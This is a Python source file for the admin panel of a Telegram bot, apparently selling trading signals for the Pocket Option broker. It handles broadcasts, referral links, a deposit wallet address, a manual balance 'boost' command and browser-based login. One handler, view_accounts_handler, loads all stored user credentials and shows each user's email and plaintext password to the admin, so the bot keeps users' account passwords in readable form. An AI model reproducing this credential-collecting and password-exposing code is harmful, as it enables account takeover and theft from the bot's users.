"""
admin_panel_handlers.py
Обробники та допоміжні функції для адмін-панелі Telegram-бота.
"""

import logging
import json
import os
from datetime import datetime, timedelta
import asyncio
from aiogram import F, Router, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, Message, InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

logger = logging.getLogger(__name__)

# from app.app.dispatcher import dp, bot, admin_panel, trading_api # Circular import
# Объекты из app.app.dispatcher импортируются внутри функций, чтобы избежать циклических импортов
from app.keyboards import (
    get_referral_settings_keyboard,
    get_cancel_keyboard,
    get_back_to_panel_keyboard,
    get_boost_active_keyboard,
)
from app.fsm import Admin
import app.database as db
from storage.credentials_storage import load_all_credentials
from services.boost_service import start_boost
# from user_handlers import show_signal_menu # Old import, no longer needed
# Avoid circular imports: import dispatcher objects lazily inside functions when needed


admin_router = Router()

@admin_router.callback_query(F.data == "admin_show_signals")
async def admin_show_signals_handler(callback: CallbackQuery, state: FSMContext):
    """Показує адміністратору меню сигналів, як звичайному користувачу."""
    # from user_handlers import show_signal_menu # Old import
    await callback.answer("Ця функція тимчасово відключена.")

@admin_router.callback_query(F.data == "none")
async def handle_none_callback(callback: CallbackQuery):
    """Обробляє колбеки від інформаційних кнопок, просто відповідаючи на них."""
    await callback.answer()

# region Service Functions
async def show_admin_panel(message: Message | CallbackQuery, state: FSMContext):
    """Відображає головну панель адміністратора."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.admin_menu)
    text = "👨‍💼 <b>Адмін-панель</b>\n\nВиберіть опцію для керування ботом:"
    
    builder = InlineKeyboardBuilder()
    
    original_keyboard = admin_panel.get_admin_keyboard()
    callbacks_to_remove = {'admin_stats', 'admin_check_cookies', 'admin_show_signals'}

    for row in original_keyboard.inline_keyboard:
        new_row = [btn for btn in row if btn.callback_data not in callbacks_to_remove]
        if new_row:
            builder.row(*new_row)
            
    builder.row(InlineKeyboardButton(text="👥 Просмотреть аккаунты", callback_data="admin_view_accounts"))
    
    markup = builder.as_markup()

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
            await message.answer()
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass # Повідомлення вже видалено
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

@admin_router.callback_query(F.data == "admin_view_accounts")
async def view_accounts_handler(callback: CallbackQuery):
    """Shows all user credentials to the admin."""
    credentials = load_all_credentials()
    if not credentials:
        await callback.answer("No credentials saved yet.", show_alert=True)
        return

    response_text = "<b>User Accounts:</b>\n\n"
    for user_id, creds in credentials.items():
        email = creds.get('email') or '—'
        password = creds.get('password') or '—'
        uid = creds.get('uid') or '—'
        response_text += (
            f"<b>User ID:</b> {user_id}\n"
            f"<b>UID:</b> {uid}\n"
            f"<b>Email:</b> <code>{email}</code>\n"
            f"<b>Password:</b> <code>{password}</code>\n"
            f"{'-'*20}\n"
        )
    
    await callback.message.edit_text(response_text, parse_mode="HTML", reply_markup=get_back_to_panel_keyboard())
    await callback.answer()

async def _show_settings_panel(message: Message | CallbackQuery, state: FSMContext):
    """Допоміжна функція для відображення меню налаштувань."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.settings)
    text = "⚙️ <b>Налаштування</b>\n\nОберіть, що бажаєте налаштувати:"
    markup = admin_panel.get_settings_keyboard()

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        finally:
            await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

async def _show_referral_panel(message: Message | CallbackQuery, state: FSMContext):
    """Допоміжна функція для відображення меню реферальних налаштувань."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.referral_settings)
    settings = admin_panel.get_referral_settings()
    text = "🔗 <b>Реферальні налаштування</b>\n\nТут ви можете змінити мінімальний депозит та реферальне посилання."
    markup = get_referral_settings_keyboard(settings)

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        finally:
            await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

# endregion

# region Main Admin Commands
@admin_router.message(Command("admin"))
async def cmd_admin(message: Message, state: FSMContext):
    """Обробляє команду /admin."""
    from app.dispatcher import admin_panel
    if admin_panel.is_admin(message.from_user.id):
        await show_admin_panel(message, state)
    else:
        await message.answer("У вас немає доступу до цієї команди.")

@admin_router.callback_query(F.data == "admin_panel")
async def cq_show_admin_panel(callback: CallbackQuery, state: FSMContext):
    """Обробляє колбек 'admin_panel' для показу головної адмін-панелі."""
    await show_admin_panel(callback, state)

@admin_router.callback_query(F.data == "admin_settings")
async def handle_show_settings(callback: CallbackQuery, state: FSMContext):
    """Обробник для входу в меню налаштувань."""
    await _show_settings_panel(callback, state)

@admin_router.message(Command("stats"))
async def show_stats_command(message: Message):
    """Відображає статистику бота. Тільки для адміністраторів."""
    from app.dispatcher import admin_panel
    if not admin_panel.is_admin(message.from_user.id):
        await message.reply("Ця команда доступна лише для адміністраторів.")
        return

    stats = admin_panel.get_statistics()

    stats_message = (
        "📊 <b>Статистика бота</b>\n\n"
        f"👤 Унікальні користувачі (в базі): {stats['total_users']}\n"
        f"🚀 Натискання /start: {stats['total_starts']}\n"
        f"✅ Верифіковані користувачі: {stats['verified_users']}\n"
        f"⏳ Користувачі в процесі верифікації: {stats['in_verification_users']}\n"
        f"📈 Згенеровано сигналів (сьогодні): {stats['signals_generated_today']}\n"
        f"📈 Згенеровано сигналів (всього): {stats['signals_generated_total']}"
    )

    await message.answer(stats_message, parse_mode="HTML")

# endregion

# region Maintenance
async def _show_maintenance_panel(message: Message | CallbackQuery, state: FSMContext):
    """Допоміжна функція для відображення меню обслуговування."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.maintenance)
    text = "🔄 <b>Керування режимом обслуговування</b>"
    markup = admin_panel.get_maintenance_keyboard()

    if isinstance(message, CallbackQuery):
        try:
            await message.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
        except TelegramBadRequest:
            try:
                await message.message.delete()
            except TelegramBadRequest:
                pass
            await message.message.answer(text, reply_markup=markup, parse_mode="HTML")
        finally:
            await message.answer()
    else:
        await message.answer(text, reply_markup=markup, parse_mode="HTML")

@admin_router.callback_query(F.data == "admin_maintenance")
async def handle_show_maintenance_panel(callback: CallbackQuery, state: FSMContext):
    """Обробник для входу в меню обслуговування."""
    await _show_maintenance_panel(callback, state)

@admin_router.callback_query(F.data == "admin_maintenance_toggle")
async def toggle_maintenance_mode(callback: CallbackQuery, state: FSMContext):
    """Перемикає режим обслуговування."""
    from app.dispatcher import admin_panel
    new_mode = not admin_panel.get_maintenance_mode()
    admin_panel.set_maintenance_mode(new_mode)
    status = "увімкнено" if new_mode else "вимкнено"

    await callback.answer(f"Режим обслуговування {status}.", show_alert=True)
    # Оновлюємо панель обслуговування, щоб показати новий статус
    await _show_maintenance_panel(callback, state)

@admin_router.callback_query(F.data == "admin_set_maintenance_msg")
async def set_maintenance_msg(callback: CallbackQuery, state: FSMContext):
    """Запитує нове повідомлення про тех. роботи."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_maintenance_message)
    await callback.message.edit_text(
        f"Поточне повідомлення:\n<i>{admin_panel.get_maintenance_message()}</i>\n\n✍️ Введіть нове:",
        reply_markup=get_cancel_keyboard("admin_maintenance"), # Назад до меню обслуговування
        parse_mode="HTML"
    )

@admin_router.message(StateFilter(Admin.change_maintenance_message), F.text)
async def process_new_maintenance_message(message: Message, state: FSMContext):
    """Оновлює повідомлення про тех. роботи."""
    from app.dispatcher import admin_panel
    admin_panel.set_maintenance_message(message.text.strip())
    await message.answer("✅ <b>Повідомлення про обслуговування оновлено.</b>", parse_mode="HTML")
    await _show_maintenance_panel(message, state)

# endregion

# region Statistics
@admin_router.callback_query(F.data == "admin_stats")
async def show_admin_stats(callback: CallbackQuery):
    """Показує статистику бота."""
    from app.dispatcher import admin_panel
    stats = admin_panel.get_statistics()

    stats_text = (
        "📊 <b>Статистика бота</b>\n\n"
        f"👤 Унікальні користувачі (в базі): {stats['total_users']}\n"
        f"🚀 Натискання /start: {stats['total_starts']}\n"
        f"✅ Верифіковані користувачі: {stats['verified_users']}\n"
        f"⏳ Користувачі в процесі верифікації: {stats['in_verification_users']}\n"
        f"📈 Згенеровано сигналів (сьогодні): {stats['signals_generated_today']}\n"
        f"📈 Згенеровано сигналів (всього): {stats['signals_generated_total']}"
    )

    try:
        await callback.message.edit_text(
            stats_text,
            reply_markup=admin_panel.get_admin_keyboard(),
            parse_mode="HTML",
        )
    except TelegramBadRequest:
        # Повідомлення не змінилося, просто відповідаємо на колбек
        await callback.answer("Дані статистики не змінилися.")
    else:
        await callback.answer()
# endregion

# region Broadcast
@admin_router.callback_query(F.data == 'admin_broadcast_menu')
async def broadcast_menu(callback: CallbackQuery, state: FSMContext):
    """Показує меню вибору типу розсилки."""
    from app.dispatcher import admin_panel
    await callback.message.edit_text(
        "📨 <b>Розсилка</b>\n\nОберіть, кому надіслати повідомлення:",
        reply_markup=admin_panel.get_broadcast_keyboard(),
        parse_mode="HTML"
    )

@admin_router.callback_query(F.data == 'admin_broadcast_all')
async def start_broadcast_all(callback: CallbackQuery, state: FSMContext):
    """Починає процес розсилки для всіх."""
    await state.set_state(Admin.send_broadcast)
    await callback.message.edit_text(
        "📨 Введіть повідомлення для розсилки. Воно буде надіслано <b>всім</b> користувачам бота.",
        reply_markup=get_cancel_keyboard("admin_broadcast_menu"),
        parse_mode="HTML"
    )

@admin_router.callback_query(F.data == 'admin_broadcast_verified')
async def start_broadcast_verified(callback: CallbackQuery, state: FSMContext):
    """Починає процес розсилки для верифікованих."""
    await state.set_state(Admin.send_verified_broadcast)
    await callback.message.edit_text(
        "📨 Введіть повідомлення для розсилки. Воно буде надіслано тільки <b>верифікованим</b> користувачам.",
        reply_markup=get_cancel_keyboard("admin_broadcast_menu"),
        parse_mode="HTML"
    )

@admin_router.message(StateFilter(Admin.send_broadcast), F.text)
async def process_broadcast_message(message: Message, state: FSMContext):
    """Надсилає розсилку всім користувачам."""
    from app.dispatcher import bot
    users = db.get_all_users()
    await send_messages_to_users(message, state, list(users.keys()))

@admin_router.message(StateFilter(Admin.send_verified_broadcast), F.text)
async def process_verified_broadcast_message(message: Message, state: FSMContext):
    """Надсилає розсилку верифікованим користувачам."""
    all_users = db.get_all_users()
    verified_user_ids = [uid for uid, udata in all_users.items() if db.is_fully_verified(int(uid))]
    await send_messages_to_users(message, state, verified_user_ids)

async def send_messages_to_users(message: Message, state: FSMContext, user_ids: list):
    """Відправляє повідомлення заданому списку користувачів."""
    from app.dispatcher import bot, admin_panel
    total_users = len(user_ids)
    count = 0
    errors = 0

    await message.answer(f"⏳ Починаю розсилку для <b>{total_users}</b> користувачів...", parse_mode="HTML")

    for user_id in user_ids:
        try:
            await bot.send_message(user_id, message.text, parse_mode="HTML")
            count += 1
            await asyncio.sleep(0.1)  # Невелика затримка
        except Exception as e:
            errors += 1
            logger.warning(f"Не вдалося відправити повідомлення користувачу {user_id}: {e}")

    await message.answer(
        f"✅ <b>Розсилка завершена.</b>\n\n"
        f"📥 Надіслано: <b>{count}</b> з {total_users}\n"
        f"❌ Помилок: <b>{errors}</b>",
        reply_markup=admin_panel.get_admin_keyboard(),
        parse_mode="HTML"
    )
    await state.clear()

# endregion

# region Settings

# Welcome Message
@admin_router.callback_query(F.data == "admin_set_welcome")
async def set_welcome_msg(callback: CallbackQuery, state: FSMContext):
    """Показує форму для зміни вітального повідомлення."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_welcome_message)
    await callback.message.edit_text(
        f"<b>Поточне повідомлення:</b>\n\n<i>{admin_panel.get_welcome_message()}</i>\n\n✍️ Введіть нове повідомлення:",
        reply_markup=get_cancel_keyboard("admin_settings"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(Admin.change_welcome_message, F.text)
async def process_new_welcome_message(message: Message, state: FSMContext):
    """Оновлює вітальне повідомлення."""
    from app.dispatcher import admin_panel
    admin_panel.set_welcome_message(message.text.strip())
    await message.answer("✅ <b>Привітальне повідомлення оновлено!</b>", parse_mode="HTML")
    await _show_settings_panel(message, state)

# Finish Message
@admin_router.callback_query(F.data == "admin_set_finish_msg")
async def set_finish_msg(callback: CallbackQuery, state: FSMContext):
    """Показує форму для зміни повідомлення про верифікацію."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_finish_message)
    await callback.message.edit_text(
        f"<b>Поточне повідомлення:</b>\n\n<i>{admin_panel.get_finish_message()}</i>\n\n✍️ Введіть нове повідомлення:",
        reply_markup=get_cancel_keyboard("admin_settings"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(Admin.change_finish_message, F.text)
async def process_new_finish_message(message: Message, state: FSMContext):
    """Оновлює повідомлення про верифікацію."""
    from app.dispatcher import admin_panel
    admin_panel.set_finish_message(message.text.strip())
    await message.answer("✅ <b>Повідомлення про верифікацію оновлено!</b>", parse_mode="HTML")
    await _show_settings_panel(message, state)

# Referral Settings
@admin_router.callback_query(F.data == "admin_set_referral")
async def show_referral_settings(callback: CallbackQuery, state: FSMContext):
    """Показує меню налаштувань реферальної програми."""
    await _show_referral_panel(callback, state)

@admin_router.callback_query(F.data == "admin_change_min_deposit")
async def change_min_deposit_start(callback: CallbackQuery, state: FSMContext):
    """Починає процес зміни мінімального депозиту."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_min_deposit)
    current_deposit = admin_panel.get_referral_settings().get('min_deposit', 0)
    await callback.message.edit_text(
        f"💰 <b>Поточний мін. депозит:</b> {current_deposit}\n\nВведіть нове значення:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(StateFilter(Admin.change_min_deposit), F.text)
async def process_new_min_deposit(message: Message, state: FSMContext):
    """Обробляє нове значення мінімального депозиту і зберігає його."""
    from app.dispatcher import admin_panel
    text = message.text.strip().replace(",", ".")
    try:
        amount = float(text)
        if amount < 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Введіть коректне невід'ємне число. Наприклад: 20 або 20.5")
        return

    admin_panel.set_min_deposit(amount)
    await message.answer(f"✅ Мінімальний депозит оновлено: ${amount}")
    await state.clear()
    await _show_referral_panel(message, state)

@admin_router.callback_query(F.data == "admin_change_ref_link")
async def change_ref_link_start(callback: CallbackQuery, state: FSMContext):
    """Починає процес зміни реферального посилання."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_referral_link)
    current_link = admin_panel.get_referral_settings().get('referral_link', 'Not set')
    await callback.message.edit_text(
        f"🔗 <b>Поточне реферальне посилання:</b>\n<code>{current_link}</code>\n\nВведіть нове посилання:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.callback_query(F.data == "admin_change_ref_link_all")
async def change_ref_link_all_start(callback: CallbackQuery, state: FSMContext):
    """Starts the process of changing the 'All World' referral link."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_ref_link_all)
    current_link = admin_panel.get_referral_settings().get('referral_link_all', 'Not set')
    await callback.message.edit_text(
        f"🔗 <b>Current 'All World' link:</b>\n<code>{current_link}</code>\n\nEnter the new link:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.callback_query(F.data == "admin_change_ref_link_russia")
async def change_ref_link_russia_start(callback: CallbackQuery, state: FSMContext):
    """Starts the process of changing the 'Russia' referral link."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_ref_link_russia)
    current_link = admin_panel.get_referral_settings().get('referral_link_russia', 'Not set')
    await callback.message.edit_text(
        f"🔗 <b>Current 'Russia' link:</b>\n<code>{current_link}</code>\n\nEnter the new link:",
        reply_markup=get_cancel_keyboard("admin_set_referral"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(StateFilter(Admin.change_referral_link), F.text)
async def process_new_ref_link(message: Message, state: FSMContext):
    """Оновлює реферальне посилання."""
    from app.dispatcher import admin_panel
    admin_panel.set_referral_link(message.text.strip())
    await message.answer("✅ <b>Реферальне посилання оновлено.</b>", parse_mode="HTML")
    await state.clear()
    await _show_referral_panel(message, state)

@admin_router.message(StateFilter(Admin.change_ref_link_all), F.text)
async def process_new_ref_link_all(message: Message, state: FSMContext):
    """Processes the new 'All World' referral link."""
    from app.dispatcher import admin_panel
    admin_panel.set_referral_link_all(message.text.strip())
    await message.answer("✅ <b>'All World' link updated.</b>", parse_mode="HTML")
    await state.clear()
    await _show_referral_panel(message, state)

@admin_router.message(StateFilter(Admin.change_ref_link_russia), F.text)
async def process_new_ref_link_russia(message: Message, state: FSMContext):
    """Processes the new 'Russia' referral link."""
    from app.dispatcher import admin_panel
    admin_panel.set_referral_link_russia(message.text.strip())
    await message.answer("✅ <b>'Russia' link updated.</b>", parse_mode="HTML")
    await state.clear()
    await _show_referral_panel(message, state)


@admin_router.callback_query(F.data == "admin_change_wallet")
async def change_wallet_address_start(callback: CallbackQuery, state: FSMContext):
    """Починає процес зміни адреси гаманця."""
    from app.dispatcher import admin_panel
    await state.set_state(Admin.change_wallet_address)
    current_wallet = admin_panel.get_wallet_address()
    await callback.message.edit_text(
        f"💳 <b>Поточний гаманець:</b>\n<code>{current_wallet}</code>\n\nВведіть нову TRC20 адресу:",
        reply_markup=get_cancel_keyboard("admin_settings"),
        parse_mode="HTML"
    )
    await callback.answer()

@admin_router.message(StateFilter(Admin.change_wallet_address), F.text)
async def process_new_wallet_address(message: Message, state: FSMContext):
    """Обробляє нову адресу гаманця."""
    from app.dispatcher import admin_panel
    new_address = message.text.strip()
    # TODO: Додати валідацію адреси TRC20
    admin_panel.set_wallet_address(new_address)
    await message.answer(f"✅ <b>Адресу гаманця оновлено.</b>", parse_mode="HTML")
    await _show_settings_panel(message, state)

# endregion

# region Auth Management
@admin_router.callback_query(F.data == "admin_auth")
async def admin_auth_callback(callback: CallbackQuery):
    """Колбек для кнопки ручної авторизації адміністратора."""
    from app.dispatcher import admin_panel, trading_api
    if not admin_panel.is_admin(callback.from_user.id):
        await callback.answer("Ця кнопка лише для адміністраторів.", show_alert=True)
        return

    # Запускаємо браузер для ручного входу
    await callback.message.edit_text("⏳ Запускаю браузер для ручної авторизації...")
    await trading_api.auth.manual_login_start()

    # Перевіряємо, що драйвер запустився
    if trading_api.auth.driver:
        await callback.message.edit_text(
            "✅ Браузер запущено.\n\n"
            "Будь ласка, увійдіть до свого акаунту Pocket Option у вікні, що відкрилося.\n\n"
            "Після успішного входу та завантаження торгового кабінету, натисніть кнопку нижче.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Я увійшов до акаунту", callback_data="admin_confirm_auth")]
            ])
        )
    else:
        await callback.message.edit_text("❌ Не вдалося запустити браузер Selenium. Перевірте логи на сервері.")
    await callback.answer()

@admin_router.callback_query(F.data == "admin_confirm_auth")
async def process_manual_login_confirmation(callback: CallbackQuery, state: FSMContext):
    """Handles the 'I have logged in' confirmation button."""
    from app.dispatcher import trading_api
    await callback.message.edit_text("⏳ Перевіряю підтвердження авторизації та оновлюю сесію...")

    # This single call now handles confirmation, saving cookies, and re-initializing the API
    success = await trading_api.perform_manual_login_confirm()

    if success:
        balance = await trading_api.get_balance()
        balance_text = f"${balance:.2f}" if balance is not None else "не вдалося отримати"
        await callback.message.answer(
            "✅ Авторизація успішна! Сесію оновлено.\n"
            f"API готовий до роботи. Поточний баланс: <b>{balance_text}</b>",
            parse_mode="HTML"
        )
    else:
        await callback.message.answer(
            "❌ Не вдалося підтвердити авторизацію. Переконайтеся, що ви увійшли до акаунту у вікні браузера, та спробуйте знову."
        )

    await show_admin_panel(callback, state)


@admin_router.callback_query(F.data == "start_manual_auth")
async def start_manual_auth_handler(callback: CallbackQuery):
    """
    Обробляє виклик 'start_manual_auth' з повідомлення-сповіщення.
    Запитує у адміна підтвердження перед початком процесу авторизації.
    """
    await admin_auth_callback(callback)

# endregion

# region Other
@admin_router.callback_query(F.data == "admin_referrals")
async def show_admin_referrals(callback: CallbackQuery, state: FSMContext):
    """Показує список рефералів."""
    # Ця функція потребує реалізації
    await callback.answer("Ця функція в розробці.", show_alert=True)


@admin_router.callback_query(F.data == "admin_check_cookies")
async def check_cookies_status(callback: CallbackQuery):
    """Перевіряє статус cookie і надсилає звіт."""
    from app.dispatcher import trading_api
    are_valid = trading_api.auth.are_cookies_valid()

    if are_valid:
        expiry_time = trading_api.auth.get_expiration_time()
        if expiry_time:
            now = datetime.now()
            time_left = expiry_time - now
            days = time_left.days
            hours, remainder = divmod(time_left.seconds, 3600)
            minutes, _ = divmod(remainder, 60)

            expiry_date_str = expiry_time.strftime("%Y-%m-%d %H:%M:%S")

            message_text = (
                f"✅ Статус Cookies\n\n"
                f"Cookie дійсні. Залишилося: {days} дн., {hours} год., {minutes} хв.\n"
                f"Наступне примусове оновлення: {expiry_date_str}"
            )
        else:
            message_text = "✅ Cookie дійсні, але не вдалося визначити точний час оновлення."
    else:
        message_text = "❌ Cookie недійсні або відсутні!\n\nНеобхідно провести ручну авторизацію."

    await callback.answer(message_text, show_alert=True)

@admin_router.callback_query(F.data == "admin_workspace")
async def show_admin_workspace(callback: CallbackQuery, state: FSMContext):
    """Показує робочу область (приклад)."""
    # Ця функція потребує реалізації
    await callback.answer("Ця функція в розробці.", show_alert=True)


@admin_router.message(Command("boost"))
async def manual_boost_command(message: Message):
    """
    Manually starts a boost for a user.
    Format: /boost <user_id> <initial_balance>
    Only for admins.
    """
    from app.dispatcher import admin_panel, bot

    if not admin_panel.is_admin(message.from_user.id):
        await message.reply("This command is for admins only.")
        return

    args = message.text.split()
    if len(args) != 3:
        await message.reply("Usage: `/boost <user_id> <initial_balance>`", parse_mode="Markdown")
        return

    try:
        user_id_to_boost = int(args[1])
        initial_balance = float(args[2])
    except (ValueError, IndexError):
        await message.reply("Invalid arguments. Please use numbers for user ID and balance.\nUsage: `/boost <user_id> <initial_balance>`", parse_mode="Markdown")
        return

    # The only platform with this boost mechanism is 'pocket'
    platform = "pocket"

    # Start the boost
    try:
        start_boost(user_id_to_boost, initial_balance, platform)

        # Notify the admin
        await message.reply(f"✅ Successfully started a boost for user `{user_id_to_boost}` with an initial balance of `${initial_balance:.2f}`.", parse_mode="Markdown")

    except Exception as e:
        logger.error(f"Failed to manually start boost for user {user_id_to_boost}: {e}")
        await message.reply(f"❌ An error occurred while trying to start the boost: `{e}`", parse_mode="Markdown")


@admin_router.callback_query(F.data == "admin_panel")
async def back_to_admin_panel(callback: CallbackQuery, state: FSMContext):
    """Обробник для повернення в головне меню адмінки."""
    await state.clear()
    await show_admin_panel(callback, state)

@admin_router.callback_query(F.data == "admin_settings")
async def back_to_settings(callback: CallbackQuery, state: FSMContext):
    """Обробник для повернення в меню налаштувань."""
    await _show_settings_panel(callback, state)